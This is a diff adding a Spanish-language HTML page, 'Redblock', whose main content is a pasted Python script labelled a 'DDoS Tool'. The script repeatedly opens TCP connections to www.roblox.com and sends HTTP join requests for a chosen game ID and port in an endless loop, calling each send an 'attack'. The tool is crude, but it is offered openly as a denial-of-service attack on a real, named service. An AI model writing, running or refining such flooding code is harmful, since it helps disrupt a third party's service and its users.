@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redblock</title>
+    <style>
+        body {
+            background-color: #000000; /* Fondo negro */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #ff0000; /* Texto blanco para el contraste */
+        }
+
+        .header {
+            background-color: #7d0000; /* Rojo */
+            padding: 10px 20px;
+            text-align: center;
+            color: #000000;
+        }
+
+        .header a {
+            color: #ff0000; /* Color rojo para el texto del enlace */
+            text-decoration: none;
+            padding: 5px 10px;
+            background-color: #000000; /* Fondo negro */
+            border: 2px solid #000000; /* Borde negro */
+            border-radius: 5px; /* Bordes redondeados */
+            margin: 0 5px; /* Espacio entre los enlaces */
+        }
+
+        .header a:hover {
+            background-color: #ff0000; /* Fondo rojo al pasar el mouse */
+            color: #000000; /* Color del texto negro al pasar el mouse */
+        }
+
+        .navbar {
+            background-color: #dc0000; /* Rojo más oscuro */
+            padding: 0.001%;
+            display: flex;
+            justify-content: space-around;
+            color: #000000;
+        }
+
+        .content {
+            display: flex;
+            flex: 1; /* Permite que el contenido principal ocupe el espacio restante */
+            padding: 20px;
+            background-color: #000000; /* Fondo negro para el contenido principal */
+        }
+
+        .sidebar {
+            width: 20%;
+            background-color: #1d1d1d; /* Gris muy oscuro para la barra lateral */
+            padding: 15px;
+            color: #ff0000; /* Blanco para el texto en la barra lateral */
+            box-sizing: border-box;
+        }
+
+        .main-content {
+            width: 80%;
+            padding: 15px;
+            background-color: #161515; /* Fondo negro para el contenido principal */
+            color: #000000; /* Blanco para el texto en el contenido principal */
+            box-sizing: border-box;
+        }
+
+        .footer {
+            background-color: #2b2929; /* Gris oscuro */
+            padding: 10px;
+            text-align: center;
+            color: #000000; /* Blanco para el texto en el pie de página */
+        }
+
+        .button {
+            background-color: #8b0000; /* Rojo intermedio */
+            color: #000000; /* Blanco para el texto en el botón */
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .button:hover {
+            background-color: #b40000; /* Rojo claro para hover */
+        }
+
+        .news-item {
+            margin-bottom: 20px;
+        }
+
+        .news-item img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+
+        .file-list ul {
+            list-style-type: none;
+            padding: 0;
+        }
+
+        .file-list li {
+            margin-bottom: 5px;
+        }
+
+        .file-list a {
+            color: #000000; /* Blanco para el texto en los enlaces de la lista de archivos */
+            text-decoration: none;
+            background-color: #ce0000; /* Rojo intermedio */
+            padding: 5px;
+            border-radius: 5px;
+        }
+
+        .file-list a:hover {
+            background-color: #ff0000; /* Rojo claro para hover */
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Redblock</h1>
+
+    </div>
+
+
+    </div>
+
+    <div class="navbar">
+    </div>
+
+    <div class="content">
+        <div class="sidebar">
+            <h2></h2>
+            <div class="file-list">
+                <ul>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="main-content">
+            <h2></h2>
+
+            <!-- Ejemplo de una noticia -->
+            <div class="news-item">
+                <h3>RSC Archives</h3>
+                <p>import os
+                    import socket
+                    
+                    # Function to clear the screen
+                    def clear_screen():
+                        os.system('cls' if os.name == 'nt' else 'clear')
+                    
+                    # Function to send TCP packets to a target game ID and port
+                    def attack(target_game_id, target_port):
+                        try:
+                            # Roblox website host
+                            target_host = "www.roblox.com"
+                    
+                            # Create a TCP socket
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    
+                            # Connect to the Roblox website and port
+                            s.connect((target_host, target_port))
+                            
+                            # Send a custom HTTP request to join a game in Roblox
+                            http_request = f"GET /games/{target_game_id}/join HTTP/1.1\r\n"
+                            http_request += f"Host: {target_host}\r\n"
+                            http_request += "User-Agent: Roblox/WinInet\r\n"
+                            http_request += "Accept-Encoding: identity\r\n"
+                            http_request += "Connection: close\r\n\r\n"
+                    
+                            s.send(http_request.encode())
+                    
+                            # Print attack information
+                            print("\033[95mJoin request sent to Roblox game ID:", target_game_id, "on port:", target_port, "using TCP and HTTP attack\033[0m")
+                    
+                            # Close the socket
+                            s.close()
+                        except Exception as e:
+                            print("Error:", e)
+                    
+                    # Function to display the banner
+                    def display_banner():
+                        banner = r'''
+                         ____  _      ______   ________ _  _   _      _      
+                        |  _ \| |    / __ \ \ / /  ____| || | | |    | |     
+                        | |_) | |   | |  | \ V /| |__  | || |_| |    | |     
+                        |  _ <| |   | |  | |> < |  __| |__   _| |    | |     
+                        | |_) | |___| |__| / . \| |       | | | |____| |____ 
+                        |____/|______\____/_/ \_\_|       |_| |______|______|
+                                                                              
+                                                                              
+                    '''
+                        print("\033[95m" + banner + "\033[0m")
+                    
+                    # Function to display menu and get user input
+                    def menu():
+                        display_banner()
+                        print("\033[95mDDoS Tool Menu:\033[0m")
+                        print("\033[95m1. Join game\033[0m")
+                        choice = input("\033[95mEnter your choice: \033[0m")
+                        return choice
+                    
+                    # Function to get attack parameters from user
+                    def get_attack_params():
+                        clear_screen()
+                        target_game_id = int(input("\033[95mEnter Roblox game ID: \033[0m"))
+                        target_port = int(input("\033[95mEnter target port (default port for HTTP is 80): \033[0m"))
+                        return target_game_id, target_port
+                    
+                    # Main function
+                    def main():
+                        has_displayed_menu = False
+                        target_set = False
+                        target_game_id = 0
+                        target_port = 0
+                    
+                        while True:
+                            if not has_displayed_menu:
+                                choice = menu()
+                                has_displayed_menu = True
+                    
+                            if choice == "1":
+                                if not target_set:
+                                    target_game_id, target_port = get_attack_params()
+                                    target_set = True
+                    
+                                # Send a join request to the game
+                                attack(target_game_id, target_port)
+                    
+                            else:
+                                clear_screen()
+                                has_displayed_menu = False
+                    
+                    # Start the program
+                    if __name__ == "__main__":
+                        main()
+                    </p>
+            </div>
+
+
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>&copy; 2024 Redblock by phobos410 and collaborators.</p>
+    </div>
+
+</body>
+</html>
